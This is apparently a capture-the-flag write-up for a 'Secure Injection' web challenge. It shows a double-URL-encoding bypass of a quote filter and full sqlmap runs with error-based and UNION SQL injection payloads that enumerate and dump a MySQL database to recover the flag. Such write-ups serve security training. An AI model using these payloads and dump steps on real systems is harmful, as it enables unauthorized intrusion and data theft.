# Challenge description

Secure and injection shouldn't coexist in the same sentence but whatever.
Access the server via
http://18.200.170.115

# Soluce

When we open the website, it says to add an "id" parameter to the URL to get a product. If we put id=1, there is no product. If we put id=2, we get a product.

The challenge name is "Secure Injection", so we can assume that the challenge is about SQL injection. We can try to inject SQL code in the "id" parameter to get the flag.

When we put a single quote (') in the "id" parameter, we get an error message saying "Bad user...", it detects the SQL injection.

Now, let's try with a double URL encoding of the single quote (%2527). It creates a SQLI error.

So, we will try with SQLmap to get the content of the database.

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://18.200.170.115/?id=%2527" --batch
        ___
       __H__                                                                                                                                                                                  
 ___ ___[']_____ ___ ___  {1.8.11#stable}                                                                                                                                                     
|_ -| . [)]     | .'| . |                                                                                                                                                                     
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:09:59 /2025-03-15/

[12:09:59] [INFO] testing connection to the target URL
[12:09:59] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
[12:09:59] [INFO] testing if the target URL content is stable
[12:10:00] [INFO] target URL content is stable
[12:10:00] [INFO] testing if GET parameter 'id' is dynamic
[12:10:00] [INFO] GET parameter 'id' appears to be dynamic
[12:10:00] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[12:10:00] [INFO] testing for SQL injection on GET parameter 'id'
[12:10:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:10:00] [WARNING] reflective value(s) found and filtering out
[12:10:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:10:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:10:01] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:10:01] [INFO] testing 'Generic inline queries'
[12:10:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:10:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:10:02] [INFO] target URL appears to be UNION injectable with 5 columns
[12:10:02] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 43 HTTP(s) requests:
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=%27 AND EXTRACTVALUE(8672,CONCAT(0x5c,0x71766a7a71,(SELECT (ELT(8672=8672,1))),0x717a766b71))-- VFzD

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=%27 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7a71,0x504e4261737174487449544642464473544d6747566c797648694c51644c4557684e467049494642,0x717a766b71),NULL-- -
---
[12:10:02] [INFO] the back-end DBMS is MySQL
[12:10:02] [WARNING] potential permission problems detected ('command denied')
web server operating system: Linux Debian
web application technology: PHP 8.2.28, Apache 2.4.62
back-end DBMS: MySQL >= 5.1
[12:10:02] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/18.200.170.115'

[*] ending @ 12:10:02 /2025-03-15/
```

We can see that the back-end DBMS is MySQL. We can now dump the database to get the flag.

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://18.200.170.115/?id=%2527" --dbs --batch
        ___
       __H__                                                                                                                                                                                  
 ___ ___[(]_____ ___ ___  {1.8.11#stable}                                                                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                                                                     
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:11:32 /2025-03-15/

[12:11:32] [INFO] resuming back-end DBMS 'mysql' 
[12:11:32] [INFO] testing connection to the target URL
[12:11:32] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=%27 AND EXTRACTVALUE(8672,CONCAT(0x5c,0x71766a7a71,(SELECT (ELT(8672=8672,1))),0x717a766b71))-- VFzD

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=%27 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7a71,0x504e4261737174487449544642464473544d6747566c797648694c51644c4557684e467049494642,0x717a766b71),NULL-- -
---
[12:11:32] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.2.28, Apache 2.4.62
back-end DBMS: MySQL >= 5.1
[12:11:32] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] productsdb

[12:11:32] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/18.200.170.115'

[*] ending @ 12:11:32 /2025-03-15/
```

We can see that there is a database named `productsdb`. We can now dump the tables of this database.

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://18.200.170.115/?id=%2527" -D productsdb --tables --batch

        ___
       __H__                                                                                                                                                                                  
 ___ ___["]_____ ___ ___  {1.8.11#stable}                                                                                                                                                     
|_ -| . [']     | .'| . |                                                                                                                                                                     
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:12:48 /2025-03-15/

[12:12:48] [INFO] resuming back-end DBMS 'mysql' 
[12:12:48] [INFO] testing connection to the target URL
[12:12:48] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=%27 AND EXTRACTVALUE(8672,CONCAT(0x5c,0x71766a7a71,(SELECT (ELT(8672=8672,1))),0x717a766b71))-- VFzD

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=%27 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7a71,0x504e4261737174487449544642464473544d6747566c797648694c51644c4557684e467049494642,0x717a766b71),NULL-- -
---
[12:12:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62, PHP 8.2.28
back-end DBMS: MySQL >= 5.1
[12:12:48] [INFO] fetching tables for database: 'productsdb'
Database: productsdb
[1 table]
+----------+
| products |
+----------+

[12:12:49] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/18.200.170.115'

[*] ending @ 12:12:49 /2025-03-15/
```

We can see that there is a table named `products`. We can now dump the columns of this table.

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://18.200.170.115/?id=%2527" -D productsdb -T products --columns --batch

        ___
       __H__                                                                                                                                                                                  
 ___ ___[.]_____ ___ ___  {1.8.11#stable}                                                                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                                                                     
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:13:38 /2025-03-15/

[12:13:38] [INFO] resuming back-end DBMS 'mysql' 
[12:13:38] [INFO] testing connection to the target URL
[12:13:38] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=%27 AND EXTRACTVALUE(8672,CONCAT(0x5c,0x71766a7a71,(SELECT (ELT(8672=8672,1))),0x717a766b71))-- VFzD

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=%27 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7a71,0x504e4261737174487449544642464473544d6747566c797648694c51644c4557684e467049494642,0x717a766b71),NULL-- -
---
[12:13:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.2.28, Apache 2.4.62
back-end DBMS: MySQL >= 5.1
[12:13:38] [INFO] fetching columns for table 'products' in database 'productsdb'
Database: productsdb
Table: products
[5 columns]
+-------------+---------------+
| Column      | Type          |
+-------------+---------------+
| description | varchar(255)  |
| name        | varchar(255)  |
| id          | int(11)       |
| price       | decimal(10,2) |
| stock       | int(11)       |
+-------------+---------------+

[12:13:39] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/18.200.170.115'

[*] ending @ 12:13:39 /2025-03-15/
```

We can see that there are 5 columns in the `products` table. We can now dump the content of this table.

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://18.200.170.115/?id=%2527" -D productsdb -T products -C description --dump --batch

        ___
       __H__                                                                                                                                                                                  
 ___ ___[.]_____ ___ ___  {1.8.11#stable}                                                                                                                                                     
|_ -| . [']     | .'| . |                                                                                                                                                                     
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:14:51 /2025-03-15/

[12:14:51] [INFO] resuming back-end DBMS 'mysql' 
[12:14:51] [INFO] testing connection to the target URL
[12:14:51] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=%27 AND EXTRACTVALUE(8672,CONCAT(0x5c,0x71766a7a71,(SELECT (ELT(8672=8672,1))),0x717a766b71))-- VFzD

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=%27 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7a71,0x504e4261737174487449544642464473544d6747566c797648694c51644c4557684e467049494642,0x717a766b71),NULL-- -
---
[12:14:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62, PHP 8.2.28
back-end DBMS: MySQL >= 5.1
[12:14:51] [INFO] fetching entries of column(s) 'description' for table 'products' in database 'productsdb'
Database: productsdb
Table: products
[50 entries]
+----------------------------------------------------------------------------------+
| description                                                                      |
+----------------------------------------------------------------------------------+
| CSC{BUTHOW???}                                                                   |
| A smartwatch with a built-in AI assistant and real-time health analytics.        |
| A smartphone with mind-controlled features and a holographic display.            |
| A smartwatch with a built-in AI assistant and real-time health analytics.        |
| A 32-inch 8K monitor with ultra-low latency and pro-grade color accuracy.        |
| A WiFi 6E router with mesh support and next-gen security encryption.             |
| A Bluetooth speaker with 360Â° surround sound and a built-in subwoofer.          |
| A WiFi 6E router with mesh support and next-gen security encryption.             |
| Wireless earbuds with adaptive noise cancellation and immersive 3D audio.        |
| A tablet engineered for creatives, featuring a 4K stylus-enabled display.        |
| A Bluetooth speaker with 360Â° surround sound and a built-in subwoofer.          |
| A 32-inch 8K monitor with ultra-low latency and pro-grade color accuracy.        |
| A mechanical keyboard with customizable macros and per-key RGB effects.          |
| A precision gaming mouse with 16K DPI and customizable side buttons.             |
| A mechanical keyboard with customizable macros and per-key RGB effects.          |
| A tablet engineered for creatives, featuring a 4K stylus-enabled display.        |
| A smartwatch with a built-in AI assistant and real-time health analytics.        |
| A smartphone with mind-controlled features and a holographic display.            |
| A WiFi 6E router with mesh support and next-gen security encryption.             |
| A smartphone with mind-controlled features and a holographic display.            |
| A 32-inch 8K monitor with ultra-low latency and pro-grade color accuracy.        |
| A 32-inch 8K monitor with ultra-low latency and pro-grade color accuracy.        |
| A WiFi 6E router with mesh support and next-gen security encryption.             |
| A precision gaming mouse with 16K DPI and customizable side buttons.             |
| A Bluetooth speaker with 360Â° surround sound and a built-in subwoofer.          |
| A futuristic laptop with AI-assisted performance and a sleek, ultra-thin design. |
| Wireless earbuds with adaptive noise cancellation and immersive 3D audio.        |
| A smartphone with mind-controlled features and a holographic display.            |
| A 32-inch 8K monitor with ultra-low latency and pro-grade color accuracy.        |
| A tablet engineered for creatives, featuring a 4K stylus-enabled display.        |
| A 32-inch 8K monitor with ultra-low latency and pro-grade color accuracy.        |
| A futuristic laptop with AI-assisted performance and a sleek, ultra-thin design. |
| Wireless earbuds with adaptive noise cancellation and immersive 3D audio.        |
| Wireless earbuds with adaptive noise cancellation and immersive 3D audio.        |
| A 32-inch 8K monitor with ultra-low latency and pro-grade color accuracy.        |
| Wireless earbuds with adaptive noise cancellation and immersive 3D audio.        |
| A 32-inch 8K monitor with ultra-low latency and pro-grade color accuracy.        |
| A precision gaming mouse with 16K DPI and customizable side buttons.             |
| Wireless earbuds with adaptive noise cancellation and immersive 3D audio.        |
| A smartphone with mind-controlled features and a holographic display.            |
| A smartwatch with a built-in AI assistant and real-time health analytics.        |
| A WiFi 6E router with mesh support and next-gen security encryption.             |
| A smartwatch with a built-in AI assistant and real-time health analytics.        |
| A WiFi 6E router with mesh support and next-gen security encryption.             |
| A WiFi 6E router with mesh support and next-gen security encryption.             |
| A smartphone with mind-controlled features and a holographic display.            |
| A smartphone with mind-controlled features and a holographic display.            |
| A futuristic laptop with AI-assisted performance and a sleek, ultra-thin design. |
| A 32-inch 8K monitor with ultra-low latency and pro-grade color accuracy.        |
| A tablet engineered for creatives, featuring a 4K stylus-enabled display.        |
+----------------------------------------------------------------------------------+

[12:14:52] [INFO] table 'productsdb.products' dumped to CSV file '/home/kali/.local/share/sqlmap/output/18.200.170.115/dump/productsdb/products.csv'
[12:14:52] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/18.200.170.115'

[*] ending @ 12:14:52 /2025-03-15/
```

We can see that the flag is `CSC{BUTHOW???}`.